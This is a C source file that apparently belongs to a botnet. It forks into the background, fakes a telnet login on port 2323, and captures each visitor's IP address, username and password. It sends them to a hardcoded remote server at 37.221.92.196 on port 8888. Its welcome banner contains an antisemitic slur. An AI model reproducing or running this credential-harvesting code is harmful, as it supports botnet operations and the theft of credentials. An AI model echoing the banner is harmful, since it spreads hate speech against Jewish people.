#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#include "headers/pot.h"

#define BUFFER_SIZE 1024
#define PORT 2323
#define REPORT_SERVER "37.221.92.196"
#define REPORT_PORT 8888

void send_report(const char* ip_address, const char* username, const char* password) {
    int sockfd;
    struct sockaddr_in server_addr;

    // Create socket
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
    }

    // Set up the server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(REPORT_PORT);
    server_addr.sin_addr.s_addr = inet_addr(REPORT_SERVER);
    memset(server_addr.sin_zero, '\0', sizeof(server_addr.sin_zero));

    // Connect to the report server
    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1) {
    }

    // Construct the report message
    char report_message[BUFFER_SIZE];
    snprintf(report_message, BUFFER_SIZE, "IP: %s, Username: %s, Password: %s", ip_address, username, password);

    // Send the report message to the report server
    write(sockfd, report_message, strlen(report_message));

    // Close the socket
    close(sockfd);
}

void handle_connection(int client_socket) {
    // Send a fake banner
    char banner[] = "Welcome to orxys jew bot!\r\n";
    write(client_socket, banner, strlen(banner));

    // Log the connection details
    struct sockaddr_in client_address;
    socklen_t client_address_length = sizeof(client_address);
    getpeername(client_socket, (struct sockaddr*)&client_address, &client_address_length);
    char client_ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(client_address.sin_addr), client_ip, INET_ADDRSTRLEN);
    //printf("Incoming connection from: %s:%d\n", client_ip, ntohs(client_address.sin_port));

    // Send the IP address to the report server
    send_report(client_ip, "", "");

    // Receive and process username
    char username[BUFFER_SIZE];
    memset(username, 0, BUFFER_SIZE);
    char username_prompt[] = "Username: ";
    write(client_socket, username_prompt, strlen(username_prompt));
    read(client_socket, username, BUFFER_SIZE);

    // Remove the trailing newline character
    username[strcspn(username, "\r\n")] = '\0';

    // Send the password prompt
    char password_prompt[] = "Password: ";
    write(client_socket, password_prompt, strlen(password_prompt));

    // Receive and process password
    char password[BUFFER_SIZE];
    memset(password, 0, BUFFER_SIZE);
    read(client_socket, password, BUFFER_SIZE);

    // Remove the trailing newline character
    password[strcspn(password, "\r\n")] = '\0';

    // Send the attempted username and password to the report server
    send_report(client_ip, username, password);

    // Simulate authentication
    if (strcmp(username, "admin") == 0 && strcmp(password, "password") == 0) {
        char auth_success[] = "Authentication successful!\r\n";
        write(client_socket, auth_success, strlen(auth_success));
    } else {
        char auth_failed[] = "Authentication failed.\r\n";
        write(client_socket, auth_failed, strlen(auth_failed));
    }

    // Receive any remaining data to prevent connection closure
    char buffer[BUFFER_SIZE];
    while (read(client_socket, buffer, BUFFER_SIZE) > 0)
        ;

    // Close the connection
    close(client_socket);
}





// ...

int pot_pid = -1;

void honeypot() {
    
    pid_t parent = fork();
    
    if (parent > 0) {
        pot_pid = parent;
        return;
    } else if (parent == -1) {
        return;
    }

    int server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_addr_length = sizeof(client_addr);

    // Create socket
    if ((server_socket = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
    }

    // Set up the server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;
    memset(server_addr.sin_zero, '\0', sizeof(server_addr.sin_zero));

    // Bind to the port
    if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1) {
    }

    // Listen for incoming connections
    if (listen(server_socket, 10) == -1) {
    }

    // Accept connections and handle them
    while (1) {
        client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &client_addr_length);
        if (client_socket == -1) {
        }

        handle_connection(client_socket);
    }

    // Close the server socket
    close(server_socket);
}